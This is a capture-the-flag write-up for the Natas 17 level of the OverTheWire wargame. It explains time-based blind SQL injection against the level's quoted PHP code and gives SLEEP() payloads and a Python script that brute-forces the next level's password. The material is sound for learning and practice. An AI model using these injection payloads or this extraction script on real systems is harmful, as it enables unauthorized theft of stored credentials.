# Natas 17 -> 18

```
http://natas17.natas.labs.overthewire.org
```

```
Username: natas17
```

Similar to `natas15` except this time, we don't have a clue if the query produced results or not.

```php
/*
CREATE TABLE `users` (
  `username` varchar(64) DEFAULT NULL,
  `password` varchar(64) DEFAULT NULL
);
*/

if(array_key_exists("username", $_REQUEST)) {
    $link = mysql_connect('localhost', 'natas17', '<censored>');
    mysql_select_db('natas17', $link);
    
    $query = "SELECT * from users where username=\"".$_REQUEST["username"]."\"";
    if(array_key_exists("debug", $_GET)) {
        echo "Executing query: $query<br>";
    }

    $res = mysql_query($query, $link);
    if($res) {
    if(mysql_num_rows($res) > 0) {
        //echo "This user exists.<br>";
    } else {
        //echo "This user doesn't exist.<br>";
    }
    } else {
        //echo "Error in query.<br>";
    }

    mysql_close($link);
} else {
?>

<form action="index.php" method="POST">
Username: <input name="username"><br>
<input type="submit" value="Check existence" />
</form>
<? }
```

But what we do know is that it'll execute `mysql_close` at the end.  
MySQL has a function called `SLEEP()` which basically *sleeps* a certain amount of time, so just like in `natas15` we need to perform a sqli with a bit of logic.  

```
?username=natas18" and SLEEP(10) and 1="1&debug=1
```

So, if the username *is* `natas18` and 1 equals to 1 and slept 10s, we will notice the delay, otherwise it'll return quickly. See it for yourself:  

```
?username=natas1234" and SLEEP(10) and 1="1&debug=1
```

Well, let's reuse the same script of `natas15`.

```python
#!/usr/bin/env python

import sys
import time
import string
import requests

url = "http://natas17.natas.labs.overthewire.org/"
http_user = "natas17"
http_pass = ""

bf_passwd = ""
bf_dict = string.ascii_letters + string.digits

while len(bf_passwd) != 32:
    for char in bf_dict:
        now = time.time()
        r = requests.get(url,
                         params={
                             'username': 'natas18" AND password LIKE BINARY "{}%" AND SLEEP(5) AND 1="1'.format(bf_passwd + char)
                         },
                         auth=(http_user, http_pass))
        then = time.time()
        sys.stdout.write("\rTrying: {} | Password: {}".format(char, bf_passwd))
        sys.stdout.flush()
        if int(now - then):
            bf_passwd += char
            sys.stdout.write("\rMatch: {} | Password: {}".format(char, bf_passwd))
            sys.stdout.flush()
            break

print "\rPassword: {}".format(bf_passwd)

```

* php
* python
* http://dev.mysql.com/doc/refman/5.7/en/miscellaneous-functions.html#function_sleep
